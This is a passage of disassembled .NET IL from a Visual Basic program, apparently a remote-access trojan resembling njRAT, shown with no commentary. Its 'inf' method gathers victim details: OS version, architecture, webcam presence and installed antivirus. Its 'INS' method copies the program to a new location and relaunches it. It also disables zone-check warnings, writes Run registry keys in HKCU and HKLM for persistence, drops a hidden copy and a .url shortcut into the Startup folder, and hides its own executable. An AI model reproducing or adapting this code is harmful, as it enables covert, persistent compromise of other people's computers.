    catch [mscorlib]System.Exception 
    {
      IL_0234:  dup
      IL_0235:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_023a:  stloc.s    V_9
      IL_023c:  ldloc.s    V_9
      IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0243:  ldloc.0
      IL_0244:  ldstr      "\?\?"
      IL_0249:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_024e:  stloc.0
      IL_024f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0254:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0259:  leave.s    IL_025b

    }  // end handler
    IL_025b:  ldloc.0
    IL_025c:  ldstr      "SP"
    IL_0261:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0266:  stloc.0
    .try
    {
      IL_0267:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_026c:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0271:  ldstr      " "
      IL_0276:  ldc.i4.m1
      IL_0277:  ldc.i4.0
      IL_0278:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_027d:  stloc.s    V_10
      IL_027f:  ldloc.s    V_10
      IL_0281:  ldlen
      IL_0282:  conv.i4
      IL_0283:  ldc.i4.1
      IL_0284:  bne.un.s   IL_0292

      IL_0286:  ldloc.0
      IL_0287:  ldstr      "0"
      IL_028c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0291:  stloc.0
      IL_0292:  ldloc.0
      IL_0293:  ldloc.s    V_10
      IL_0295:  ldloc.s    V_10
      IL_0297:  ldlen
      IL_0298:  conv.i4
      IL_0299:  ldc.i4.1
      IL_029a:  sub.ovf
      IL_029b:  ldelem.ref
      IL_029c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02a1:  stloc.0
      IL_02a2:  leave.s    IL_02cb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a4:  dup
      IL_02a5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02aa:  stloc.s    V_11
      IL_02ac:  ldloc.s    V_11
      IL_02ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b3:  ldloc.0
      IL_02b4:  ldstr      "0"
      IL_02b9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02be:  stloc.0
      IL_02bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c9:  leave.s    IL_02cb

    }  // end handler
    IL_02cb:  nop
    .try
    {
      IL_02cc:  ldc.i4.s   38
      IL_02ce:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02d3:  ldstr      "x86"
      IL_02d8:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02dd:  brfalse.s  IL_02f2

      IL_02df:  ldloc.0
      IL_02e0:  ldstr      " x64"
      IL_02e5:  ldsfld     string j.OK::Y
      IL_02ea:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02ef:  stloc.0
      IL_02f0:  br.s       IL_0303

      IL_02f2:  ldloc.0
      IL_02f3:  ldstr      " x86"
      IL_02f8:  ldsfld     string j.OK::Y
      IL_02fd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0302:  stloc.0
      IL_0303:  leave.s    IL_032c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0305:  dup
      IL_0306:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_030b:  stloc.s    V_12
      IL_030d:  ldloc.s    V_12
      IL_030f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0314:  ldloc.0
      IL_0315:  ldsfld     string j.OK::Y
      IL_031a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_031f:  stloc.0
      IL_0320:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0325:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_032a:  leave.s    IL_032c

    }  // end handler
    IL_032c:  call       bool j.OK::Cam()
    IL_0331:  brfalse.s  IL_0346

    IL_0333:  ldloc.0
    IL_0334:  ldstr      "Yes"
    IL_0339:  ldsfld     string j.OK::Y
    IL_033e:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0343:  stloc.0
    IL_0344:  br.s       IL_0357

    IL_0346:  ldloc.0
    IL_0347:  ldstr      "No"
    IL_034c:  ldsfld     string j.OK::Y
    IL_0351:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0356:  stloc.0
    IL_0357:  ldc.i4.7
    IL_0358:  newarr     [mscorlib]System.String
    IL_035d:  dup
    IL_035e:  ldc.i4.0
    IL_035f:  ldloc.0
    IL_0360:  stelem.ref
    IL_0361:  dup
    IL_0362:  ldc.i4.1
    IL_0363:  call       string j.OK::GetAntiVirus()
    IL_0368:  stelem.ref
    IL_0369:  dup
    IL_036a:  ldc.i4.2
    IL_036b:  ldsfld     string j.OK::Y
    IL_0370:  stelem.ref
    IL_0371:  dup
    IL_0372:  ldc.i4.3
    IL_0373:  call       string j.OK::GetAntiVirus()
    IL_0378:  stelem.ref
    IL_0379:  dup
    IL_037a:  ldc.i4.4
    IL_037b:  ldsfld     string j.OK::Y
    IL_0380:  stelem.ref
    IL_0381:  dup
    IL_0382:  ldc.i4.5
    IL_0383:  call       string j.OK::GetAntiVirus()
    IL_0388:  stelem.ref
    IL_0389:  dup
    IL_038a:  ldc.i4.6
    IL_038b:  ldsfld     string j.OK::Y
    IL_0390:  stelem.ref
    IL_0391:  call       string [mscorlib]System.String::Concat(string[])
    IL_0396:  stloc.0
    IL_0397:  ldstr      ""
    IL_039c:  stloc.1
    .try
    {
      IL_039d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_03a2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_03a7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_03ac:  ldstr      "Software\\"
      IL_03b1:  ldsfld     string j.OK::RG
      IL_03b6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03bb:  ldc.i4.0
      IL_03bc:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03c1:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03c6:  stloc.s    V_14
      IL_03c8:  ldc.i4.0
      IL_03c9:  stloc.s    V_15
      IL_03cb:  br.s       IL_03f3

      IL_03cd:  ldloc.s    V_14
      IL_03cf:  ldloc.s    V_15
      IL_03d1:  ldelem.ref
      IL_03d2:  stloc.s    V_13
      IL_03d4:  ldloc.s    V_13
      IL_03d6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03db:  ldc.i4.s   32
      IL_03dd:  bne.un.s   IL_03ed

      IL_03df:  ldloc.1
      IL_03e0:  ldloc.s    V_13
      IL_03e2:  ldstr      ","
      IL_03e7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ec:  stloc.1
      IL_03ed:  ldloc.s    V_15
      IL_03ef:  ldc.i4.1
      IL_03f0:  add.ovf
      IL_03f1:  stloc.s    V_15
      IL_03f3:  ldloc.s    V_15
      IL_03f5:  ldloc.s    V_14
      IL_03f7:  ldlen
      IL_03f8:  conv.i4
      IL_03f9:  blt.s      IL_03cd

      IL_03fb:  leave.s    IL_0418

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03fd:  dup
      IL_03fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0403:  stloc.s    V_16
      IL_0405:  ldloc.s    V_16
      IL_0407:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_040c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0411:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0416:  leave.s    IL_0418

    }  // end handler
    IL_0418:  ldloc.0
    IL_0419:  ldloc.1
    IL_041a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_041f:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       1011 (0x3f3)
    .maxstack  8
    .locals init (uint8[] V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             string V_6,
             object V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldsfld     bool j.OK::Idr
    IL_000f:  brfalse    IL_0126

    IL_0014:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0019:  ldsfld     string j.OK::DR
    IL_001e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0023:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0028:  ldstr      "\\"
    IL_002d:  ldsfld     string j.OK::EXE
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0041:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0046:  brtrue     IL_0126

    .try
    {
      IL_004b:  ldsfld     string j.OK::DR
      IL_0050:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0055:  ldstr      "\\"
      IL_005a:  ldsfld     string j.OK::EXE
      IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0064:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0069:  brfalse.s  IL_0089

      IL_006b:  ldsfld     string j.OK::DR
      IL_0070:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0075:  ldstr      "\\"
      IL_007a:  ldsfld     string j.OK::EXE
      IL_007f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0084:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0089:  ldsfld     string j.OK::DR
      IL_008e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0093:  ldstr      "\\"
      IL_0098:  ldsfld     string j.OK::EXE
      IL_009d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a2:  ldc.i4.1
      IL_00a3:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00a8:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00ad:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00b2:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00b7:  stloc.0
      IL_00b8:  dup
      IL_00b9:  ldloc.0
      IL_00ba:  ldc.i4.0
      IL_00bb:  ldloc.0
      IL_00bc:  ldlen
      IL_00bd:  conv.i4
      IL_00be:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00c3:  dup
      IL_00c4:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00c9:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00ce:  ldsfld     string j.OK::DR
      IL_00d3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00d8:  ldstr      "\\"
      IL_00dd:  ldsfld     string j.OK::EXE
      IL_00e2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00e7:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00ec:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00f6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00fb:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0100:  pop
      IL_0101:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0106:  leave.s    IL_0126

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0108:  dup
      IL_0109:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_010e:  stloc.1
      IL_010f:  ldloc.1
      IL_0110:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0115:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_011a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0124:  leave.s    IL_0126

    }  // end handler
    IL_0126:  nop
    .try
    {
      IL_0127:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_012c:  ldstr      "1"
      IL_0131:  ldc.i4.1
      IL_0132:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0137:  leave.s    IL_0152

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0139:  dup
      IL_013a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013f:  stloc.2
      IL_0140:  ldloc.2
      IL_0141:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0146:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0150:  leave.s    IL_0152

    }  // end handler
    IL_0152:  ldsfld     bool j.OK::Isu
    IL_0157:  brfalse    IL_020f

    .try
    {
      IL_015c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0161:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0166:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_016b:  ldsfld     string j.OK::sf
      IL_0170:  ldc.i4.1
      IL_0171:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0176:  ldsfld     string j.OK::RG
      IL_017b:  ldstr      "\""
      IL_0180:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0185:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_018a:  ldstr      "\" .."
      IL_018f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0194:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0199:  leave.s    IL_01b4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_019b:  dup
      IL_019c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01a1:  stloc.3
      IL_01a2:  ldloc.3
      IL_01a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01a8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b2:  leave.s    IL_01b4

    }  // end handler
    IL_01b4:  nop
    .try
    {
      IL_01b5:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01ba:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01bf:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_01c4:  ldsfld     string j.OK::sf
      IL_01c9:  ldc.i4.1
      IL_01ca:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01cf:  ldsfld     string j.OK::RG
      IL_01d4:  ldstr      "\""
      IL_01d9:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01de:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01e3:  ldstr      "\" .."
      IL_01e8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01ed:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_01f2:  leave.s    IL_020f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01f4:  dup
      IL_01f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01fa:  stloc.s    V_4
      IL_01fc:  ldloc.s    V_4
      IL_01fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0208:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_020d:  leave.s    IL_020f

    }  // end handler
    IL_020f:  ldsfld     bool j.OK::IsF
    IL_0214:  brfalse    IL_03f2

    .try
    {
      IL_0219:  ldc.i4.7
      IL_021a:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_021f:  ldstr      "\\"
      IL_0224:  ldsfld     string j.OK::RG
      IL_0229:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_022e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0233:  brfalse.s  IL_024f

      IL_0235:  ldc.i4.7
      IL_0236:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_023b:  ldstr      "\\"
      IL_0240:  ldsfld     string j.OK::RG
      IL_0245:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_024a:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_024f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0254:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0259:  ldc.i4.7
      IL_025a:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_025f:  ldstr      "\\"
      IL_0264:  ldsfld     string j.OK::RG
      IL_0269:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_026e:  ldc.i4.1
      IL_026f:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_0274:  ldc.i4.7
      IL_0275:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_027a:  ldstr      "\\"
      IL_027f:  ldsfld     string j.OK::RG
      IL_0284:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0289:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_028e:  stloc.s    V_5
      IL_0290:  ldc.i4.7
      IL_0291:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0296:  ldstr      "\\"
      IL_029b:  ldloc.s    V_5
      IL_029d:  ldstr      ".url"
      IL_02a2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02a7:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_02ac:  brfalse.s  IL_02ca

      IL_02ae:  ldc.i4.7
      IL_02af:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02b4:  ldstr      "\\"
      IL_02b9:  ldloc.s    V_5
      IL_02bb:  ldstr      ".url"
      IL_02c0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02c5:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_02ca:  ldc.i4.7
      IL_02cb:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02d0:  ldstr      "\\"
      IL_02d5:  ldsfld     string j.OK::RG
      IL_02da:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02df:  stloc.s    V_6
      IL_02e1:  ldc.i4.7
      IL_02e2:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02e7:  ldstr      "\\"
      IL_02ec:  ldloc.s    V_5
      IL_02ee:  ldstr      ".url"
      IL_02f3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02f8:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
      IL_02fd:  stloc.s    V_7
      .try
      {
        IL_02ff:  ldloc.s    V_6
        IL_0301:  ldc.i4.2
        IL_0302:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                          valuetype [mscorlib]System.IO.FileAttributes)
        IL_0307:  ldloc.s    V_7
        IL_0309:  ldnull
        IL_030a:  ldstr      "WriteLine"
        IL_030f:  ldc.i4.1
        IL_0310:  newarr     [mscorlib]System.Object
        IL_0315:  dup
        IL_0316:  ldc.i4.0
        IL_0317:  ldstr      "[InternetShortcut]"
        IL_031c:  stelem.ref
        IL_031d:  ldnull
        IL_031e:  ldnull
        IL_031f:  ldnull
        IL_0320:  ldc.i4.1
        IL_0321:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_0326:  pop
        IL_0327:  ldloc.s    V_7
        IL_0329:  ldnull
        IL_032a:  ldstr      "WriteLine"
        IL_032f:  ldc.i4.1
        IL_0330:  newarr     [mscorlib]System.Object
        IL_0335:  dup
        IL_0336:  ldc.i4.0
        IL_0337:  ldstr      "URL=file:///"
        IL_033c:  ldloc.s    V_6
        IL_033e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0343:  stelem.ref
        IL_0344:  ldnull
        IL_0345:  ldnull
        IL_0346:  ldnull
        IL_0347:  ldc.i4.1
        IL_0348:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_034d:  pop
        IL_034e:  ldloc.s    V_7
        IL_0350:  ldnull
        IL_0351:  ldstr      "WriteLine"
        IL_0356:  ldc.i4.1
        IL_0357:  newarr     [mscorlib]System.Object
        IL_035c:  dup
        IL_035d:  ldc.i4.0
        IL_035e:  ldstr      "IconIndex=17"
        IL_0363:  stelem.ref
        IL_0364:  ldnull
        IL_0365:  ldnull
        IL_0366:  ldnull
        IL_0367:  ldc.i4.1
        IL_0368:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_036d:  pop
        IL_036e:  ldloc.s    V_7
        IL_0370:  ldnull
        IL_0371:  ldstr      "WriteLine"
        IL_0376:  ldc.i4.1
        IL_0377:  newarr     [mscorlib]System.Object
        IL_037c:  dup
        IL_037d:  ldc.i4.0
        IL_037e:  ldstr      "IconFile=C:\\Windows\\system32\\SHELL32.dll"
        IL_0383:  stelem.ref
        IL_0384:  ldnull
        IL_0385:  ldnull
        IL_0386:  ldnull
        IL_0387:  ldc.i4.1
        IL_0388:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_038d:  pop
        IL_038e:  ldloc.s    V_7
        IL_0390:  ldnull
        IL_0391:  ldstr      "Flush"
        IL_0396:  ldc.i4.0
        IL_0397:  newarr     [mscorlib]System.Object
        IL_039c:  ldnull
        IL_039d:  ldnull
        IL_039e:  ldnull
        IL_039f:  ldc.i4.1
        IL_03a0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_03a5:  pop
        IL_03a6:  leave.s    IL_03b9

      }  // end .try
      finally
      {
        IL_03a8:  ldloc.s    V_7
        IL_03aa:  brfalse.s  IL_03b8

        IL_03ac:  ldloc.s    V_7
        IL_03ae:  castclass  [mscorlib]System.IDisposable
        IL_03b3:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_03b8:  endfinally
      }  // end handler
      IL_03b9:  ldsfld     bool j.OK::HIDE_ME
      IL_03be:  box        [mscorlib]System.Boolean
      IL_03c3:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_03c8:  brfalse.s  IL_03d5

      IL_03ca:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_03cf:  ldc.i4.2
      IL_03d0:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_03d5:  leave.s    IL_03f2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03d7:  dup
      IL_03d8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03dd:  stloc.s    V_8
      IL_03df:  ldloc.s    V_8
      IL_03e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
